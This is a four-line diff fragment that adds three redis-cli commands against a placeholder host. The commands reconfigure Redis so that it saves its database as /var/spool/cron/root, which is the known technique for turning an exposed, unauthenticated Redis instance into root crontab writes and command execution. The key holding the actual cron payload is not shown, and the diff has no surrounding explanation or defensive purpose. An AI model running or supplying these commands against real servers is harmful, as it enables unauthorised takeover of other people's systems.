@@ -1,0 +1,4 @@
+redis-cli -h example.invalid config set dir /var/spool/cron/
+redis-cli -h example.invalid config set dbfilename root
+redis-cli -h example.invalid save
+
